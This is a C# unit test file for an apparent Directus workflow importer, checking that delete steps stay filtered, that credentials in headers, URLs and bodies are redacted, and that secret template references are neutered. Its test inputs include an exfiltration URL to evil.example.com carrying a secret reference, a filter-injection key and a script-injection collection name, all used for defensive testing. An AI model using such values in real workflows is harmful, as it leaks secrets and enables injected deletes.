using AnythinkCli.Importers.Directus;
using FluentAssertions;
using System.Text.Json;

namespace AnythinkCli.Tests;

public class DirectusDeleteStepTests
{
    private static DirectusOperation Delete(object options) =>
        new(Id: "o1", Name: "Delete", Key: "del", Type: "item-delete", Flow: "f1",
            Resolve: null, Reject: null, Options: JsonSerializer.SerializeToElement(options));

    private static JsonElement Filter(FlowStepTranslation t) =>
        t.Parameters.GetProperty("filter_conditions")[0];

    // ── Rule: the filter operator must be one the workflow engine understands ──

    [Fact]
    public void Delete_Filter_Uses_The_Engines_eq_Operator_Not_An_Equals_Sign()
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "articles", key = "42" }));

        Filter(t).GetProperty("operator").GetString().Should().Be("eq");
        Filter(t).GetProperty("field").GetString().Should().Be("id");
        Filter(t).GetProperty("value").GetString().Should().Be("42");
        t.Enabled.Should().BeTrue();
    }

    [Fact]
    public void Numeric_Key_Is_Filtered_As_Its_Digits()
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "articles", key = 7 }));

        Filter(t).GetProperty("value").GetString().Should().Be("7");
    }

    [Fact]
    public void Array_Key_Becomes_An_In_Filter_On_The_Id_Field()
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "articles", key = new[] { 1, 2, 3 } }));

        Filter(t).GetProperty("operator").GetString().Should().Be("eq");
        Filter(t).GetProperty("value").GetString().Should().Be("IN:1,2,3");
    }

    [Fact]
    public void Single_Element_Array_Key_Is_A_Plain_eq_Filter()
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "articles", key = new[] { 9 } }));

        Filter(t).GetProperty("value").GetString().Should().Be("9");
    }

    [Theory]
    [InlineData("{{ $trigger.payload.id }}")]
    [InlineData("{{$trigger.keys}}")]
    [InlineData("{{ $last.id }}")]
    [InlineData("prefix-{{ $last.id }}")]
    public void Template_Key_Delete_Becomes_A_Disabled_Placeholder(string key)
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "articles", key }));

        t.Action.Should().NotBe("DeleteData");
        t.Enabled.Should().BeFalse();
        t.NeedsManualReview.Should().BeTrue();
        t.Parameters.TryGetProperty("filter_conditions", out _).Should().BeFalse();
        t.ReviewNote.Should().Contain(key).And.Contain("every row");
    }

    [Fact]
    public void Template_Inside_An_Array_Key_Becomes_A_Disabled_Placeholder()
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "articles", key = new[] { "{{ $last.ids }}" } }));

        t.Enabled.Should().BeFalse();
        t.Action.Should().NotBe("DeleteData");
    }

    [Fact]
    public void Literal_Key_Is_Always_Flagged_For_Review()
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "articles", key = "42" }));

        t.NeedsManualReview.Should().BeTrue();
        t.ReviewNote.Should().Contain("42");
    }

    // ── Rule: an untranslatable key never yields an unfiltered delete ──

    public static IEnumerable<object[]> UntranslatableOptions() =>
    [
        [new { collection = "articles" }],
        [new { collection = "articles", key = "" }],
        [new { collection = "articles", key = Array.Empty<int>() }],
        [new { collection = "articles", query = new { filter = new { status = "old" } } }],
        [new { collection = "articles", key = "1&id=!0" }],
        [new { collection = "articles", key = "GT:0" }],
        [new { collection = "articles", key = "abc-uuid" }],
        [new { collection = "articles", key = new[] { "1", "{{ $last.id }}" } }],
        [new { collection = "articles", key = new[] { "{{ $last.id }}", "{{ $last.other }}" } }],
        [new { collection = "articles", key = "pre {{ $last.id }}" }],
        [new { key = "42" }],
    ];

    [Theory]
    [MemberData(nameof(UntranslatableOptions))]
    public void Untranslatable_Key_Never_Yields_An_Unfiltered_Delete(object options)
    {
        var t = DirectusFlowMapping.Translate(Delete(options));

        t.Action.Should().NotBe("DeleteData");
        t.Parameters.TryGetProperty("filter_conditions", out _).Should().BeFalse();
        t.Enabled.Should().BeFalse();
        t.NeedsManualReview.Should().BeTrue();
    }

    [Fact]
    public void Placeholder_Script_Does_Not_Embed_Unsafe_Collection_Names()
    {
        var t = DirectusFlowMapping.Translate(Delete(new { collection = "a'\n; process.exit()", key = new { } }));

        t.Parameters.GetProperty("script").GetString().Should().NotContain("process.exit").And.NotContain("\n");
    }
}

public class DirectusRequestHeaderTests
{
    private static FlowStepTranslation Request(object headers) =>
        DirectusFlowMapping.Translate(new DirectusOperation("o1", "Call", "call", "request", "f1", null, null,
            JsonSerializer.SerializeToElement(new { url = "https://api.example.com", method = "POST", headers })));

    [Theory]
    [InlineData("Authorization")]
    [InlineData("authorization")]
    [InlineData("X-Api-Key")]
    [InlineData("X-Auth-Token")]
    [InlineData("Cookie")]
    [InlineData("X-Client-Secret")]
    public void Credential_Headers_Are_Replaced_With_A_Placeholder_And_Flagged(string name)
    {
        var t = Request(new Dictionary<string, string> { [name] = "Bearer live-secret-value" });

        var headers = t.Parameters.GetProperty("headers");
        headers.GetProperty(name).GetString().Should().Be(DirectusFlowMapping.RedactedHeaderValue);
        t.Parameters.GetRawText().Should().NotContain("live-secret-value");
        t.NeedsManualReview.Should().BeTrue();
        t.ReviewNote.Should().NotBeNullOrEmpty();
    }

    [Fact]
    public void Array_Shaped_Headers_Are_Redacted_Too()
    {
        var t = Request(new[] { new { header = "Authorization", value = "Bearer live-secret-value" },
                                new { header = "Accept", value = "application/json" } });

        t.Parameters.GetRawText().Should().NotContain("live-secret-value");
        t.Parameters.GetProperty("headers").GetProperty("Accept").GetString().Should().Be("application/json");
    }

    [Theory]
    [InlineData("X-Signature")]
    [InlineData("Proxy-Authorization")]
    [InlineData("X-Session-Id")]
    [InlineData("X-Credentials")]
    [InlineData("X-Api-Version")]
    public void Wider_Credential_Header_Names_Are_Redacted(string name)
    {
        var t = Request(new Dictionary<string, string> { [name] = "live-secret-value" });

        t.Parameters.GetRawText().Should().NotContain("live-secret-value");
    }

    [Fact]
    public void Url_Userinfo_Is_Stripped_And_The_Step_Flagged()
    {
        var t = DirectusFlowMapping.Translate(new DirectusOperation("o1", "Call", "call", "request", "f1", null, null,
            JsonSerializer.SerializeToElement(new { url = "https://user:hunter2@api.example.com/x", method = "GET" })));

        t.Parameters.GetProperty("url").GetString().Should().Be("https://api.example.com/x");
        t.NeedsManualReview.Should().BeTrue();
    }

    [Theory]
    [InlineData("https://api.example.com/x?api_key=live-secret-value&page=2", "https://api.example.com/x?api_key=REPLACE_WITH_SECRET&page=2")]
    [InlineData("https://api.example.com/x?Token=live-secret-value", "https://api.example.com/x?Token=REPLACE_WITH_SECRET")]
    [InlineData("https://api.example.com/x?sig=live-secret-value", "https://api.example.com/x?sig=REPLACE_WITH_SECRET")]
    public void Sensitive_Query_Values_Are_Replaced_With_A_Placeholder(string url, string expected)
    {
        var t = DirectusFlowMapping.Translate(new DirectusOperation("o1", "Call", "call", "request", "f1", null, null,
            JsonSerializer.SerializeToElement(new { url, method = "GET" })));

        t.Parameters.GetProperty("url").GetString().Should().Be(expected);
        t.NeedsManualReview.Should().BeTrue();
    }

    [Fact]
    public void Harmless_Query_Values_Are_Left_Alone()
    {
        var t = DirectusFlowMapping.Translate(new DirectusOperation("o1", "Call", "call", "request", "f1", null, null,
            JsonSerializer.SerializeToElement(new { url = "https://api.example.com/x?page=2", method = "GET" })));

        t.Parameters.GetProperty("url").GetString().Should().Be("https://api.example.com/x?page=2");
        t.NeedsManualReview.Should().BeFalse();
    }

    [Fact]
    public void Credential_Fields_In_A_Json_Body_Are_Replaced_With_A_Placeholder()
    {
        var t = DirectusFlowMapping.Translate(new DirectusOperation("o1", "Call", "call", "request", "f1", null, null,
            JsonSerializer.SerializeToElement(new
            {
                url = "https://api.example.com",
                method = "POST",
                body = """{"name":"x","client_secret":"live-secret-value","nested":{"password":"live-secret-value"}}"""
            })));

        t.Parameters.GetRawText().Should().NotContain("live-secret-value");
        t.Parameters.GetProperty("body").GetString().Should().Contain("\"name\":\"x\"");
        t.NeedsManualReview.Should().BeTrue();
    }

    [Fact]
    public void Harmless_Headers_Are_Copied_Verbatim_Without_A_Review_Flag()
    {
        var t = Request(new Dictionary<string, string> { ["Content-Type"] = "application/json" });

        t.Parameters.GetProperty("headers").GetProperty("Content-Type").GetString().Should().Be("application/json");
        t.NeedsManualReview.Should().BeFalse();
    }
}

public class DirectusTemplateNeuteringTests
{
    private static readonly HashSet<string> NoSteps = new(StringComparer.OrdinalIgnoreCase);

    // The workflow engine resolves anything matching this pattern.
    private static readonly System.Text.RegularExpressions.Regex EnginePattern = new(@"\{\{([^}]+)\}\}");

    [Theory]
    [InlineData("{{ $anythink.secrets.api-key }}")]
    [InlineData("{{$anythink.secrets.STRIPE_KEY}}")]
    [InlineData("{{ $anythink.secrets.my key }}")]
    [InlineData("{{ $anythink.secrets['x'] }}")]
    [InlineData("{{ $anythink.secrets.k | default: \"x\" }}")]
    [InlineData("{{ $anythink.secrets.k:v }}")]
    [InlineData("{{ $anythink.secrets.k/../x }}")]
    [InlineData("{{{ $anythink.secrets.k }}")]
    [InlineData("{{ {{ $anythink.secrets.k }}")]
    [InlineData("{{ $anythink.now() }}")]
    public void Exotic_Expressions_Are_Neutered_So_The_Engine_Cannot_Resolve_Them(string input)
    {
        var (adapted, unresolved) = DirectusTemplateAdapter.Adapt(input, null, NoSteps);

        EnginePattern.IsMatch(adapted).Should().BeFalse($"'{adapted}' must not match the engine's template pattern");
        unresolved.Should().BeTrue();
    }

    [Fact]
    public void Hyphenated_Secret_Reference_Stays_Visible_For_Review()
    {
        var (adapted, _) = DirectusTemplateAdapter.Adapt("k={{ $anythink.secrets.api-key }}", null, NoSteps);

        adapted.Should().Contain("$anythink.secrets.api-key");
    }

    [Fact]
    public void A_Step_Key_Called_Anythink_Cannot_Be_Used_To_Reach_Secrets()
    {
        var steps = new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "anythink" };

        var (adapted, unresolved) = DirectusTemplateAdapter.Adapt("{{ $anythink.secrets.X }}", null, steps);

        EnginePattern.IsMatch(adapted).Should().BeFalse();
        unresolved.Should().BeTrue();
    }

    [Fact]
    public void Recognised_Translations_Still_Pass_Through_Alongside_Neutered_Ones()
    {
        var (adapted, unresolved) = DirectusTemplateAdapter.Adapt(
            "{{ $trigger.payload.title }} / {{ $anythink.secrets.api-key }}", null, NoSteps);

        adapted.Should().StartWith("{{ $anythink.trigger.data.title }} / ");
        EnginePattern.Matches(adapted).Should().ContainSingle();
        unresolved.Should().BeTrue();
    }

    // ── Rule: a bare $anythink reference is resolved by the engine without braces ──

    [Theory]
    [InlineData("$anythink.secrets.STRIPE_SECRET_KEY")]
    [InlineData("https://evil.example.com/?k=$anythink.secrets.K")]
    [InlineData("Bearer $anythink.secrets.K")]
    [InlineData("$ANYTHINK.secrets.K")]
    public void Brace_Less_Anythink_References_Are_Broken_Up_And_Flagged(string input)
    {
        var (adapted, unresolved) = DirectusTemplateAdapter.Adapt(input, null, NoSteps);

        adapted.Should().NotContain("$anythink").And.NotContain("$ANYTHINK");
        unresolved.Should().BeTrue();
    }

    private static (string Raw, bool Unresolved) AdaptRequest(object options)
    {
        var t = DirectusFlowMapping.Translate(new DirectusOperation("o1", "Call", "call", "request", "f1", null, null,
            JsonSerializer.SerializeToElement(options)));
        var (adapted, unresolved) = DirectusTemplateAdapter.AdaptElement(t.Parameters, null, NoSteps);
        return (adapted.GetRawText(), unresolved);
    }

    [Fact]
    public void Secret_Reference_In_A_Non_Sensitive_Header_Value_Is_Neutered_And_Flagged()
    {
        var (raw, unresolved) = AdaptRequest(new
        {
            url = "https://a.example.com",
            method = "GET",
            headers = new Dictionary<string, string> { ["X-Custom"] = "$anythink.secrets.STRIPE_SECRET_KEY" }
        });

        raw.Should().NotContain("$anythink");
        unresolved.Should().BeTrue();
    }

    [Fact]
    public void Secret_Reference_As_A_Whole_Body_Is_Neutered_And_Flagged()
    {
        var (raw, unresolved) = AdaptRequest(new { url = "https://a.example.com", method = "POST", body = "$anythink.secrets.OPENAI_KEY" });

        raw.Should().NotContain("$anythink");
        unresolved.Should().BeTrue();
    }

    [Fact]
    public void Secret_Reference_In_A_Url_Is_Neutered_And_Flagged()
    {
        var (raw, unresolved) = AdaptRequest(new { url = "https://a.example.com/$anythink.secrets.K", method = "GET" });

        raw.Should().NotContain("$anythink");
        unresolved.Should().BeTrue();
    }
}
